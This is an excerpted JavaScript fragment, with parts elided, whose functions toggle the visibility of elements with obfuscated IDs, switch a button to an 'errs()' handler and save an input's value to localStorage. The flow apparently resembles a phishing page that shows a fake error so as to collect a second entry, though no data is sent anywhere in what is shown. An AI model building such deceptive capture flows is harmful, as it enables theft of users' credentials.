...
function vbd(params) {
  document.getElementById("AoKvmGtBuncIBBXs").style.display = "none";

  document.getElementById("mxLRLDLOWkkKsDR").style.display = "none";
  document.getElementById("tlVVJNECrWGtadXs").style.display = "block";
  document.getElementById("btn2").setAttribute("onclick", "errs()");
}

function errs(params) {
  document.getElementById("n4m3").style.display = "none";
  document.getElementById("mxLRLDLOWkkKsDRs").style.display = "block";
  document.getElementById("tlVVJNECrWGtadXs").style.display = "none";
...
function pch(params) {
  if (document.getElementById("tlVVJNECrWGtadXs").value.length < 4) {
    ...
    localStorage.setItem(
      "commonss",
      document.getElementById("mxLRLDLOWkkKsDRs").value
    );
